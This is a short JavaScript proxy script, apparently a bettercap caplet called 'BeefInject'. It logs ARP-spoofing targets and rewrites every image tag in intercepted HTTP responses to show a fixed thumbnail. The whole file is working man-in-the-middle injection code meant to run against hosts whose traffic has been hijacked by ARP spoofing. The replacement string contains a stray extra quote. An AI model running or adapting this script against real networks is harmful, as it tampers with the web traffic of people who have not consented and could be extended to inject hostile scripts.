function onLoad() {
log( "BeefInject loaded." );
log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
var body = res.ReadBody();
res.Body = res.Body.replace(/<img .*?>/ig, "<img src='https://i.ytimg.com/vi/EtH9Yllzjcc/hqdefault.jpg''>");
}
